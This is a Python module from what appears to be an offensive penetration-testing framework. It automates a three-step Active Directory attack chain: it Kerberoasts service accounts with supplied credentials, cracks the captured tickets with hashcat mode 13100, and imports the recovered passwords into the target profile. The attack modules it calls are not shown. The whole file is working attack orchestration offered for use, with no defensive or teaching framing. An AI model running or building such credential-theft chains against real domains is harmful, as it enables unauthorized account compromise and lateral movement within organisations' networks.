def run(args):
    from core.runner import run_module_by_name
    from core.target import load_current_profile, get_all_creds
    from core.paths import get_artifacts_dir
    from core.paths import get_chain_artifacts_dir

    data, _ = load_current_profile()
    creds = get_all_creds(data)

    artifacts = get_chain_artifacts_dir(data["name"], "kerberoast")

    hashes = artifacts / "kerberoast_hashes.txt"
    cracked = artifacts / "cracked.txt"
    parsed = artifacts / "cracked_parsed.txt"

    quiet_flag = ["--quiet"] if getattr(args, "quiet", False) else []

    def confirm(msg):
        if args.auto:
            return True
        return input(f"[?] {msg} (Y/n): ").lower() in ["", "y"]

    # ---------------- PRECHECK ----------------
    if any(f.exists() for f in [parsed, cracked, hashes]):
        if not confirm("Existing artifacts detected → continue anyway?"):
            return

    # ---------------- STEP 0 ----------------
    if not creds:
        print("[!] Kerberoasting requires credentials")
        return

    if not data.get("domain"):
        print("[!] Domain not set")
        return


    # ---------------- STEP 1 ----------------
    print("[1/3] Kerberoasting")

    if confirm("Run Kerberoast attack?"):
        run_module_by_name("ad.kerberoast", [
            "--out", str(hashes),
            *quiet_flag
        ], data)
        if not ensure_nonempty_file(hashes, "Kerberoast failed → aborting"):
         return

    else:
        return

    # ---------------- STEP 2 ----------------
    print("[2/3] Crack hashes")

    if confirm("Crack hashes with hashcat?"):
        run_module_by_name("crack.hash", [
            str(hashes),
            "--mode", "13100",
            "--out", str(cracked),
            *quiet_flag
        ], data)

        if not ensure_nonempty_file(cracked, "No cracked credentials → aborting"):
         return
    else:
        return

    # ---------------- STEP 3 ----------------
    print("[3/3] Import credentials")

    if confirm("Add new credentials to target?"):
        run_module_by_name("parse.creds", [
            str(cracked)
        ], data)


def ensure_nonempty_file(path, msg):
    if not path.exists():
        print(f"[!] {msg} (file missing)")
        return False

    if path.stat().st_size == 0:
        print(f"[!] {msg} (file empty)")
        return False

    return True
